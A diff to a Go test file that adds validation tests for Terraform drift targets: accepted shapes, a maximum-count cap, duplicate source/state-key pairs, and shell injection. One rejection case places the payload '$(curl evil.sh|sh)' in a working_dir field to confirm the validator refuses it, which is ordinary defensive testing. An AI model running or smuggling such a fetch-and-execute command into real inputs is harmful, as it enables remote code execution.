@@ -1,6 +1,9 @@
 package api
 
-import "testing"
+import (
+	"fmt"
+	"testing"
+)
 
 func TestValidatePipelineInputs_Valid(t *testing.T) {
 	cases := []struct {
@@ -25,6 +28,73 @@ func TestValidatePipelineInputs_Valid(t *testing.T) {
 			}
 		})
 	}
+}
+
+// TestValidateDriftTargets_Valid pins the accepted shapes: a handful of
+// distinct targets, and any number of "untracked" targets (empty source_id AND
+// state_key) which are exempt from the duplicate check because there is no
+// detection identity to collide on.
+func TestValidateDriftTargets_Valid(t *testing.T) {
+	cases := []struct {
+		name  string
+		items []DriftTargetItem
+	}{
+		{name: "empty", items: nil},
+		{name: "one legacy-shaped item", items: []DriftTargetItem{{SourceID: "s1", StateKey: "app.tfstate", WorkingDir: "infra/"}}},
+		{name: "several distinct targets", items: []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
+			{SourceID: "s1", StateKey: "app2.tfstate", WorkingDir: "app2/"},
+			{SourceID: "s2", StateKey: "app1.tfstate", WorkingDir: "app3/"},
+		}},
+		{name: "many untracked targets (no source_id/state_key) are not duplicates of each other", items: []DriftTargetItem{
+			{WorkingDir: "a/"}, {WorkingDir: "b/"}, {WorkingDir: "c/"},
+		}},
+		{name: "exactly the cap", items: makeDriftTargetItems(maxDriftTargets)},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if err := validateDriftTargets(tc.items); err != nil {
+				t.Fatalf("expected valid, got error: %v", err)
+			}
+		})
+	}
+}
+
+func makeDriftTargetItems(n int) []DriftTargetItem {
+	items := make([]DriftTargetItem, n)
+	for i := range items {
+		items[i] = DriftTargetItem{SourceID: "s1", StateKey: fmt.Sprintf("app%d.tfstate", i), WorkingDir: fmt.Sprintf("app%d/", i)}
+	}
+	return items
+}
+
+// TestValidateDriftTargets_Rejects pins the three refusals: a per-item
+// injection attempt, more than maxDriftTargets items, and a repeated
+// (source_id, state_key) pair within one request.
+func TestValidateDriftTargets_Rejects(t *testing.T) {
+	t.Run("injection in one item's working_dir", func(t *testing.T) {
+		items := []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
+			{SourceID: "s1", StateKey: "app2.tfstate", WorkingDir: "$(curl evil.sh|sh)"},
+		}
+		if err := validateDriftTargets(items); err == nil {
+			t.Fatal("expected rejection for shell-hostile working_dir")
+		}
+	})
+	t.Run("over the cap", func(t *testing.T) {
+		if err := validateDriftTargets(makeDriftTargetItems(maxDriftTargets + 1)); err == nil {
+			t.Fatal("expected rejection for exceeding maxDriftTargets")
+		}
+	})
+	t.Run("duplicate source_id+state_key", func(t *testing.T) {
+		items := []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1-again/"},
+		}
+		if err := validateDriftTargets(items); err == nil {
+			t.Fatal("expected rejection for a duplicate (source_id, state_key) pair")
+		}
+	})
 }
 
 func TestValidatePipelineInputs_RejectsInjection(t *testing.T) {
